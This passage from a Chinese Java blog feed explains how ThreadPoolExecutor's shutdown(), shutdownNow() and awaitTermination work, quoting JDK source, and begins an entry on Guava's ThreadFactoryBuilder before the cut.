<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://www.jianshu.com/p/c321d0808a1b" rel="external nofollow noopener noreferrer" target="_blank">jinfo命令详解 - 简书</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzU3NDAxMzU1Nw==&amp;mid=2247484957&amp;idx=3&amp;sn=ee1e459b6e579555b7006cb69a6bb7f1&amp;chksm=fd39af07ca4e2611707621a71dedfa7329668d741fa2b4bdc9835ef14583cf79adb378d8d6c6&amp;mpshare=1&amp;scene=1&amp;srcid=1123RfpGGNhu1XF30IA20OFH#rd" rel="external nofollow noopener noreferrer" target="_blank">Java调优经验谈</a></p>
</li>
<li><p><a href="http://rednaxelafx.iteye.com/blog/1049240" rel="external nofollow noopener noreferrer" target="_blank">通过jinfo工具在full GC前后做heap dump - Script Ahead, Code Behind - ITeye博客</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzODYyNjkzNw==&amp;mid=2247483687&amp;idx=1&amp;sn=41f24dac62c0ca65e4dfe32eae62f3f2&amp;chksm=e9373031de40b927497e5b9aa5dacae6e0a5bac8c760e05ae1d983baf700f45fe8f6c1cfca41&amp;mpshare=1&amp;scene=1&amp;srcid=0904E8auyJdEzKjyytGtjpVO#rd" rel="external nofollow noopener noreferrer" target="_blank">关键业务系统的JVM参数推荐(2016热冬版）</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jinfo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[executor总结]]></title>
      <url>http://qsli.github.io/2017/11/19/executor/</url>
      <content type="html"><![CDATA[<h2 id="shutdown-和shutdownNow"><a href="#shutdown-和shutdownNow" class="headerlink" title="shutdown()和shutdownNow()"></a>shutdown()和shutdownNow()</h2><h3 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown()"></a>shutdown()</h3><p><code>shutdown()</code>会尝试中断空闲的线程，并把<code>ThreadPool</code>的状态置成<code>SHUTDOWN</code>,<br>这个状态下，不能通过<code>submit()</code>或者<code>execute()</code>提交任务，但是正在执行的和任务队列中的任务还可以继续执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">    mainLock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        checkShutdownAccess();</span><br><span class="line">        advanceRunState(SHUTDOWN);</span><br><span class="line">        interruptIdleWorkers();</span><br><span class="line">        onShutdown(); <span class="comment">// hook for ScheduledThreadPoolExecutor</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mainLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    tryTerminate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>任务队列中的任务拉取, 通过<code>getTask()</code>方法进行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">runWorker</span><span class="params">(Worker w)</span> </span>&#123;</span><br><span class="line">      Thread wt = Thread.currentThread();</span><br><span class="line">      Runnable task = w.firstTask;</span><br><span class="line">      w.firstTask = <span class="keyword">null</span>;</span><br><span class="line">      w.unlock(); <span class="comment">// allow interrupts</span></span><br><span class="line">      <span class="keyword">boolean</span> completedAbruptly = <span class="keyword">true</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">              w.lock();</span><br><span class="line">              <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">              <span class="comment">// if not, ensure thread is not interrupted.  This</span></span><br><span class="line">              <span class="comment">// requires a recheck in second case to deal with</span></span><br><span class="line">              <span class="comment">// shutdownNow race while clearing interrupt</span></span><br><span class="line">              <span class="keyword">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class="line">                   (Thread.interrupted() &amp;&amp;</span><br><span class="line">                    runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class="line">                  !wt.isInterrupted())</span><br><span class="line">                  wt.interrupt();</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  beforeExecute(wt, task);</span><br><span class="line">                  Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      task.run();</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">                  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                      afterExecute(task, thrown);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                  task = <span class="keyword">null</span>;</span><br><span class="line">                  w.completedTasks++;</span><br><span class="line">                  w.unlock();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          completedAbruptly = <span class="keyword">false</span>;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          processWorkerExit(w, completedAbruptly);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="shutdownNow"><a href="#shutdownNow" class="headerlink" title="shutdownNow()"></a>shutdownNow()</h3><p><code>shutdownNow()</code>会中断所有的<code>worker</code>线程， 然后将队列里没有执行的任务全部停止并返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Runnable&gt; <span class="title">shutdownNow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       List&lt;Runnable&gt; tasks;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           checkShutdownAccess();</span><br><span class="line">           advanceRunState(STOP);</span><br><span class="line">           interruptWorkers();</span><br><span class="line">           tasks = drainQueue();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">       tryTerminate();</span><br><span class="line">       <span class="keyword">return</span> tasks;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>中断线程池中的线程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Interrupts all threads, even if active. Ignores SecurityExceptions</span></span><br><span class="line"><span class="comment">    * (in which case some threads may remain uninterrupted).</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">               w.interruptIfStarted();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">interruptIfStarted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           Thread t;</span><br><span class="line">           <span class="keyword">if</span> (getState() &gt;= <span class="number">0</span> &amp;&amp; (t = thread) != <span class="keyword">null</span> &amp;&amp; !t.isInterrupted()) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   t.interrupt();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>停止任务队列中没有执行的任务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Drains the task queue into a new list, normally using</span></span><br><span class="line"><span class="comment">    * drainTo. But if the queue is a DelayQueue or any other kind of</span></span><br><span class="line"><span class="comment">    * queue for which poll or drainTo may fail to remove some</span></span><br><span class="line"><span class="comment">    * elements, it deletes them one by one.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> List&lt;Runnable&gt; <span class="title">drainQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       BlockingQueue&lt;Runnable&gt; q = workQueue;</span><br><span class="line">       ArrayList&lt;Runnable&gt; taskList = <span class="keyword">new</span> ArrayList&lt;Runnable&gt;();</span><br><span class="line">       q.drainTo(taskList);</span><br><span class="line">       <span class="keyword">if</span> (!q.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Runnable r : q.toArray(<span class="keyword">new</span> Runnable[<span class="number">0</span>])) &#123;</span><br><span class="line">               <span class="keyword">if</span> (q.remove(r))</span><br><span class="line">                   taskList.add(r);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> taskList;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>java中线程的停止是协作式的，线程要主动检查<code>interrupted</code>状态，并做出响应才能正确退出。</p>
<h3 id="JVM退出"><a href="#JVM退出" class="headerlink" title="JVM退出"></a>JVM退出</h3><ul>
<li>非守护线程</li>
</ul>
<p>如果线程池里的线程是非守护线程， JVM会等待线程的退出，然后才会真正的推出。</p>
<ul>
<li>守护线程（不推荐）</li>
</ul>
<p>JVM退出的时候不会等待守护线程，因此如果要等待所有的任务执行完后再退出，需要自己代码处理, 可以使用<code>awaitTermination</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">awaitTermination</span><span class="params">(<span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> nanos = unit.toNanos(timeout);</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        mainLock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (runStateAtLeast(ctl.get(), TERMINATED))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (nanos &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                nanos = termination.awaitNanos(nanos);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            mainLock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>termination</code>是结束的条件队列</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Lock held on access to workers set and related bookkeeping.</span></span><br><span class="line"><span class="comment"> * While we could use a concurrent set of some sort, it turns out</span></span><br><span class="line"><span class="comment"> * to be generally preferable to use a lock. Among the reasons is</span></span><br><span class="line"><span class="comment"> * that this serializes interruptIdleWorkers, which avoids</span></span><br><span class="line"><span class="comment"> * unnecessary interrupt storms, especially during shutdown.</span></span><br><span class="line"><span class="comment"> * Otherwise exiting threads would concurrently interrupt those</span></span><br><span class="line"><span class="comment"> * that have not yet interrupted. It also simplifies some of the</span></span><br><span class="line"><span class="comment"> * associated statistics bookkeeping of largestPoolSize etc. We</span></span><br><span class="line"><span class="comment"> * also hold mainLock on shutdown and shutdownNow, for the sake of</span></span><br><span class="line"><span class="comment"> * ensuring workers set is stable while separately checking</span></span><br><span class="line"><span class="comment"> * permission to interrupt and actually interrupting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wait condition to support awaitTermination</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition termination = mainLock.newCondition();</span><br></pre></td></tr></table></figure>
<p>线程池在退出的时候会唤醒等待在这个队列上的线程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">tryTerminate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">            <span class="keyword">if</span> (isRunning(c) ||</span><br><span class="line">                runStateAtLeast(c, TIDYING) ||</span><br><span class="line">                (runStateOf(c) == SHUTDOWN &amp;&amp; ! workQueue.isEmpty()))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">if</span> (workerCountOf(c) != <span class="number">0</span>) &#123; <span class="comment">// Eligible to terminate</span></span><br><span class="line">                interruptIdleWorkers(ONLY_ONE);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctl.compareAndSet(c, ctlOf(TIDYING, <span class="number">0</span>))) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        terminated();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        ctl.set(ctlOf(TERMINATED, <span class="number">0</span>));</span><br><span class="line">                        termination.signalAll(); <span class="comment">// 唤醒等待在这个条件上的线程</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else retry on failed CAS</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>线程池状态:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * The run state of this task, initially NEW.  The run state</span></span><br><span class="line"><span class="comment">    * transitions to a terminal state only in methods set,</span></span><br><span class="line"><span class="comment">    * setException, and cancel.  During completion, state may take on</span></span><br><span class="line"><span class="comment">    * transient values of COMPLETING (while outcome is being set) or</span></span><br><span class="line"><span class="comment">    * INTERRUPTING (only while interrupting the runner to satisfy a</span></span><br><span class="line"><span class="comment">    * cancel(true)). Transitions from these intermediate to final</span></span><br><span class="line"><span class="comment">    * states use cheaper ordered/lazy writes because values are unique</span></span><br><span class="line"><span class="comment">    * and cannot be further modified.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * Possible state transitions:</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; NORMAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; COMPLETING -&gt; EXCEPTIONAL</span></span><br><span class="line"><span class="comment">    * NEW -&gt; CANCELLED</span></span><br><span class="line"><span class="comment">    * NEW -&gt; INTERRUPTING -&gt; INTERRUPTED</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NEW          = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COMPLETING   = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NORMAL       = <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EXCEPTIONAL  = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED    = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTING = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> INTERRUPTED  = <span class="number">6</span>;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://cdn2.jianshu.io/p/c079d59ba7c8" rel="external nofollow noopener noreferrer" target="_blank">拆轮子：全面剖析 ThreadPoolExecutor（2）-众人拾柴 - 简书</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> executor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Guava中的ThreadFactoryBuilder]]></title>
      <url>http://qsli.github.io/2017/11/18/ThreadFactoryBuilder/</url>
      <content type="html"><![CDATA[<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>java中自定义线程池时可以传入一个<code>ThreadFactory</code>，用来创建线程。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Creates a new &#123;<span class="doctag">@code</span> ThreadPoolExecutor&#125; with the given initial</span></span><br><span class="line"><span class="comment">    * parameters and default rejected execution handler.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> corePoolSize the number of threads to keep in the pool, even</span></span><br><span class="line"><span class="comment">    *        if they are idle, unless &#123;<span class="doctag">@code</span> allowCoreThreadTimeOut&#125; is set</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> maximumPoolSize the maximum number of threads to allow in the</span></span><br><span class="line"><span class="comment">    *        pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> keepAliveTime when the number of threads is greater than</span></span><br><span class="line"><span class="comment">    *        the core, this is the maximum time that excess idle threads</span></span><br><span class="line"><span class="comment">    *        will wait for new tasks before terminating.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> unit the time unit for the &#123;<span class="doctag">@code</span> keepAliveTime&#125; argument</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> workQueue the queue to use for holding tasks before they are</span></span><br><span class="line"><span class="comment">    *        executed.  This queue will hold only the &#123;<span class="doctag">@code</span> Runnable&#125;</span></span><br><span class="line"><span class="comment">    *        tasks submitted by the &#123;<span class="doctag">@code</span> execute&#125; method.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> threadFactory the factory to use when the executor</span></span><br><span class="line"><span class="comment">    *        creates a new thread</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalArgumentException if one of the following holds:&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> corePoolSize &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> keepAliveTime &lt; 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt;= 0&#125;&lt;br&gt;</span></span><br><span class="line"><span class="comment">    *         &#123;<span class="doctag">@code</span> maximumPoolSize &lt; corePoolSize&#125;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NullPointerException if &#123;<span class="doctag">@code</span> workQueue&#125;</span></span><br><span class="line"><span class="comment">    *         or &#123;<span class="doctag">@code</span> threadFactory&#125; is null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                             TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                             BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,</span><br><span class="line">            threadFactory, defaultHandler);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><code>ThreadFactory</code>接口只有一个方法，就是创建线程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ThreadFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a new &#123;<span class="doctag">@code</span> Thread&#125;.  Implementations may also initialize</span></span><br><span class="line"><span class="comment">     * priority, name, daemon status, &#123;<span class="doctag">@code</span> ThreadGroup&#125;, etc.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> r a runnable to be executed by new thread instance</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> constructed thread, or &#123;<span class="doctag">@code</span> null&#125; if the request to</span></span><br><span class="line"><span class="comment">     *         create a thread is rejected</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Thread <span class="title">newThread</span><span class="params">(Runnable r)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建<code>Thread</code>时可以设置一些列的属性， 属性比较多，于是<code>guava</code>里有一个便利类 ———— <code>ThreadFactoryBuilder</code>。</p>
<p>直接看<code>build</code>方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ThreadFactory <span class="title">build</span><span class="params">(ThreadFactoryBuilder builder)</span> 